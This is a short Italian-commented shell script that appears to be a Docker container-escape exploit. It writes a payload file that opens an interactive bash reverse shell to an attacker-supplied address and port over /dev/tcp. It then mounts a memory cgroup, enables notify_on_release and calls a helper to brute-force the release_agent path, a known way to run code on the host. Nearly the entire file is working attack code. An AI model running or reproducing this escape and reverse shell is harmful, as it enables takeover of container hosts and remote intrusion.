#!/bin/sh

if [ -z "$1" ] || [ -z "$2" ]
then
    echo "uso: docker run -it [...] nome_container:versione_container  indirizzo  porta";
    exit 1
fi

#creo payload
cat > /payload << __EOF__
#!/bin/bash

DIR="\$( cd "\$( dirname "\${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
touch "\$DIR/fine"

/bin/bash -i >& /dev/tcp/$1/$2 0>&1 2>&1
__EOF__
chmod 777 /payload

#monto cgroup
mkdir /tmp/cgrp; 
mount -t cgroup -o memory cgroup /tmp/cgrp; 
mkdir /tmp/cgrp/x;
echo 1 > /tmp/cgrp/x/notify_on_release;

#bruteforce su release_agent
./brute






